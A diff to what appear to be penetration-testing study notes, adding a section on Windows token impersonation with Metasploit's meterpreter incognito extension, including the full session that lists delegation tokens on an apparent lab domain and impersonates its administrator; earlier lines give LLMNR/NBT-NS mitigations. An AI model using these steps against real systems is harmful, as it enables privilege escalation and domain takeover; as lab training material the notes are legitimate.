@@ -17,3 +17,46 @@ Best option is to disable LLMNR and NBT-NS.
 If company must use LLMNR and NBT-NS, enable Network Access Control (if attacker cannot access to networ, tha attack can not be performed )
 Require Strong user password (e.g. >12 characters in lengt and limit common word usage)
 ```
+
+#### Token Impersonation (meterpreter)
+Requirements: 
+- NT AUTHORITY SYSTEM
+- meterpreter proc arch = sys arch
+```
+meterpreter > load incognito 
+Loading extension incognito...Success.
+meterpreter > list_tokens 
+Usage: list_tokens <list_order_option>
+
+Lists all accessible tokens and their privilege level
+
+OPTIONS:
+
+    -g        List tokens by unique groupname
+    -u        List tokens by unique username
+
+meterpreter > list_tokens -u
+
+Delegation Tokens Available
+========================================
+Font Driver Host\UMFD-0
+Font Driver Host\UMFD-1
+Font Driver Host\UMFD-2
+MARVEL\Administrator
+MARVEL\fcastle
+NT AUTHORITY\LOCAL SERVICE
+NT AUTHORITY\NETWORK SERVICE
+NT AUTHORITY\SYSTEM
+Window Manager\DWM-1
+Window Manager\DWM-2
+
+Impersonation Tokens Available
+========================================
+No tokens available
+
+meterpreter > getuid 
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > impersonate_token MARVEL\\Administrator
+[+] Delegation token available
+[+] Successfully impersonated user MARVEL\Administrator
+```
